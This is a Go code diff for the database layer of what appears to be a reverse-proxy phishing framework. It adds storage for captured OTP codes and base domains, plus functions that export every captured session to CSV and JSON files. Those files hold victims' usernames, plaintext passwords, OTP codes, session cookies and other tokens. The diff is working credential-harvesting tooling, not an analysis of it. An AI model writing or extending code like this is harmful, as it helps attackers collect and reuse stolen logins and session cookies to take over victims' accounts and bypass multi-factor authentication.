@@ -1,8 +1,13 @@
 package database
 
 import (
+	"encoding/csv"
 	"encoding/json"
+	"fmt"
+	"os"
 	"strconv"
+	"strings"
+	"time"
 
 	"github.com/tidwall/buntdb"
 )
@@ -69,6 +74,16 @@ func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[stri
 	return err
 }
 
+func (d *Database) SetSessionOtpCodes(sid string, otpCodes []string, otpFieldName string) error {
+	err := d.sessionsUpdateOtpCodes(sid, otpCodes, otpFieldName)
+	return err
+}
+
+func (d *Database) SetSessionBaseDomain(sid string, baseDomain string) error {
+	err := d.sessionsUpdateBaseDomain(sid, baseDomain)
+	return err
+}
+
 func (d *Database) DeleteSession(sid string) error {
 	s, err := d.sessionsGetBySid(sid)
 	if err != nil {
@@ -89,6 +104,145 @@ func (d *Database) DeleteSessionById(id int) error {
 
 func (d *Database) Flush() {
 	d.db.Shrink()
+}
+
+type SessionExportRecord struct {
+	ID             int      `json:"id"`
+	SessionID      string   `json:"session_id"`
+	Phishlet       string   `json:"phishlet"`
+	LandingURL     string   `json:"landing_url"`
+	Username       string   `json:"username"`
+	Password       string   `json:"password"`
+	BaseDomain     string   `json:"base_domain"`
+	UserAgent      string   `json:"user_agent"`
+	RemoteAddr     string   `json:"remote_addr"`
+	OtpCodes       []string `json:"otp_codes"`
+	OtpFieldName   string   `json:"otp_field_name"`
+	CreateTime     string   `json:"create_time"`
+	UpdateTime     string   `json:"update_time"`
+	HttpTokens     string   `json:"http_tokens"`
+	CookieTokens   string   `json:"cookie_tokens"`
+	BodyTokens     string   `json:"body_tokens"`
+}
+
+func (d *Database) formatUnixTime(ts int64) string {
+	if ts == 0 {
+		return ""
+	}
+	return time.Unix(ts, 0).UTC().Format(time.RFC3339)
+}
+
+func (d *Database) mapToJSONString(m interface{}) string {
+	if m == nil {
+		return ""
+	}
+	b, err := json.Marshal(m)
+	if err != nil {
+		return ""
+	}
+	return string(b)
+}
+
+func (d *Database) getExportRecords() ([]SessionExportRecord, error) {
+	sessions, err := d.sessionsList()
+	if err != nil {
+		return nil, err
+	}
+	var records []SessionExportRecord
+	for _, s := range sessions {
+		rec := SessionExportRecord{
+			ID:           s.Id,
+			SessionID:    s.SessionId,
+			Phishlet:     s.Phishlet,
+			LandingURL:   s.LandingURL,
+			Username:     s.Username,
+			Password:     s.Password,
+			BaseDomain:   s.BaseDomain,
+			UserAgent:    s.UserAgent,
+			RemoteAddr:   s.RemoteAddr,
+			OtpCodes:     s.OtpCodes,
+			OtpFieldName: s.OtpFieldName,
+			CreateTime:   d.formatUnixTime(s.CreateTime),
+			UpdateTime:   d.formatUnixTime(s.UpdateTime),
+			HttpTokens:   d.mapToJSONString(s.HttpTokens),
+			CookieTokens: d.mapToJSONString(s.CookieTokens),
+			BodyTokens:   d.mapToJSONString(s.BodyTokens),
+		}
+		records = append(records, rec)
+	}
+	return records, nil
+}
+
+func (d *Database) ExportSessionsCSV(prefix string) (string, error) {
+	records, err := d.getExportRecords()
+	if err != nil {
+		return "", err
+	}
+	timestamp := time.Now().Format("20060102_150405")
+	filename := fmt.Sprintf("%ssessions_%s.csv", prefix, timestamp)
+
+	f, err := os.Create(filename)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+
+	w := csv.NewWriter(f)
+	defer w.Flush()
+
+	header := []string{"ID", "CreateTime", "UpdateTime", "SessionID", "BaseDomain", "Phishlet",
+		"Username", "Password", "OtpCodes", "OtpField", "UserAgent", "RemoteAddr",
+		"LandingURL", "HttpTokens", "CookieTokens", "BodyTokens"}
+	if err := w.Write(header); err != nil {
+		return "", err
+	}
+
+	for _, r := range records {
+		row := []string{
+			strconv.Itoa(r.ID),
+			r.CreateTime,
+			r.UpdateTime,
+			r.SessionID,
+			r.BaseDomain,
+			r.Phishlet,
+			r.Username,
+			r.Password,
+			strings.Join(r.OtpCodes, ";"),
+			r.OtpFieldName,
+			r.UserAgent,
+			r.RemoteAddr,
+			r.LandingURL,
+			r.HttpTokens,
+			r.CookieTokens,
+			r.BodyTokens,
+		}
+		if err := w.Write(row); err != nil {
+			return "", err
+		}
+	}
+	return filename, nil
+}
+
+func (d *Database) ExportSessionsJSON(prefix string) (string, error) {
+	records, err := d.getExportRecords()
+	if err != nil {
+		return "", err
+	}
+	timestamp := time.Now().Format("20060102_150405")
+	filename := fmt.Sprintf("%ssessions_%s.json", prefix, timestamp)
+
+	f, err := os.Create(filename)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+
+	enc := json.NewEncoder(f)
+	enc.SetIndent("", "  ")
+	if err := enc.Encode(records); err != nil {
+		return "", err
+	}
+	return filename, nil
 }
 
 func (d *Database) genIndex(table_name string, id int) string {
